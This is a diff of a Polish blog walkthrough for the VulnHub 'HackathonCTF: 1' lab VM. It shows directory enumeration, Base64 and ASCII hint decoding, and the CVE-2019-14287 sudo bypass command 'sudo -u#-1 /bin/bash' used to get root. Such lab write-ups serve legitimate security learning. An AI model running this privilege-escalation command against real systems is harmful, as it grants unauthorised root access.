@@ -15,14 +15,13 @@ header:
 ---
 # Metainfo
 
-| | |
 |:----|:----|
 |Nazwa:|HackathonCTF: 1|
 |Autor:|[Somu-sen](https://www.vulnhub.com/author/somu-sen,747/)|
 |Wypuszczony:|27.10.2020|
 |Do ściągnięcia:|[Stąd](https://www.vulnhub.com/entry/hackathonctf-1,591/)|
 |Poziom:|Łatwy|
-|Nauczysz się:|Metasploit, Sudo, ASCII, BASE64|
+|Nauczysz się:|Metasploit, Sudo, ASCII, Base64|
 
 # Wstęp
 **HackathonCTF:1** został stworzony, jak i dużo innych ciekawych obrazów, przez [Somu Sen](https://www.vulnhub.com/author/somu-sen,747/). W tej wirtualce Twoim zadaniem jest zdobycie **root**a (flag nie widziałem). Ten obraz jest naprawdę prosty i będziesz miał dużo frajdy, jeżeli sam to wszystko przejdziesz. Wirtualka jest na **Ubuntu 14.04**, więc ja na swoim **XPC-NG** nawet nie musiałem nic grzebać, żeby sieciówka się dobrze uruchomiła.
@@ -332,7 +331,8 @@ c3NoLWJydXRlZm9yY2Utc3Vkb2l0Cg==
 ```bash
 # gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://172.16.1.167 -x php,txt,html,htm
 ```
-Bingo, są strony: **http://172.16.1.167/sudo.html** i **http://172.16.1.167/ftc.html**. Ich zawartość jest poniżej.
+Bingo, są strony: **http://172.16.1.167/sudo.html** i **http://172.16.1.167/ftc.html**. Ich zawartość jest poniżej:
+{: .text-justify}
 <div class="notice--primary" markdown="1">
 sudo.html
 <pre>
@@ -365,25 +365,22 @@ ftc.html
 </p>
 </pre>
 </div>
-
-
 Zamieńmy skryptem liczby na przystępny tekst:
 {: .text-justify}
 ```bash
 #!/bin/bash
-
 tablica=(115 101 32 114 111 99 107 121 111 117 46 116 120 116)
 
 for i in ${tablica[@]}; do
-#echo $i
 str1=$(printf "%x" $i)
 string=$string""$str1
 done
 
 echo $string -n | xxd -r -p
 ```
-Po rozkodowaniu wychodzi **se rockyou.txt**. 
-
+```console
+se rockyou.txt
+```
 Został nam do rozkodowania ciąg **c3NoLWJydXRlZm9yY2Utc3Vkb2l0Cg==**, który jest w **robots.txt**. Tam zaś jest zakodowany ciąg w **Base64**.
 {: .text-justify}
 ```bash
@@ -417,12 +414,14 @@ Matching Defaults entries for test on ctf:
 User test may run the following commands on ctf:
     (ALL, !root) ALL
 ```
-**(ALL, !root) ALL** - to jest ciekawe.
+**(ALL, !root) ALL** - to jest ciekawe
+{: .notice--warning}
+
 ## Podatność CVE 2019-14287
 ```bash
 # sudo -u#-1 /bin/bash
 ```
-Ta komenda daje dostęp do **root**a. Poszukałem trochę po necie i się dowiedziałem, że jest to podatność z CVE 2019-14287. Możesz o niej przeczytać [tutaj](https://www.exploit-db.com/exploits/47502). Przeglądając historię z konsoli, jeszcze widzimy plik **pass.txt**. Mając **root**a szybko coś znajdziemy.
+Ta komenda daje dostęp do **root**a. Poszukałem trochę po necie i się dowiedziałem, że jest to podatność z **CVE 2019-14287**. Możesz o niej przeczytać [tutaj](https://www.exploit-db.com/exploits/47502). Przeglądając historię z konsoli, jeszcze widzimy plik **pass.txt**. Mając **root**a szybko coś znajdziemy:
 {: .text-justify}
 ```bash
 # root@ctf:~# find / -name pass.txt
@@ -434,7 +433,7 @@ Dekodujemy:
 # test@ctf:~$ echo Q1RGZGZyR0hZalVzU3NLS0AxMjM0NQo= | base64 -d
 CTFdfrGHYjUsSsKK@12345
 ```
-Jest hasło, ale nie wiadomo do czego. ;) Potem się okazało, że się przydało do pliku /var/zip.rar. W pliku nic nie było.
+Jest hasło, ale nie wiadomo do czego. :smiley: Potem się okazało, że się przydało do pliku **/var/zip.rar**. W pliku nic nie było.
 {: .text-justify}
 Podsumowując: Bardzo ciekawy i dosyć łatwy obraz do złamania. W sam raz dla początkujących.
 {: .notice--success}
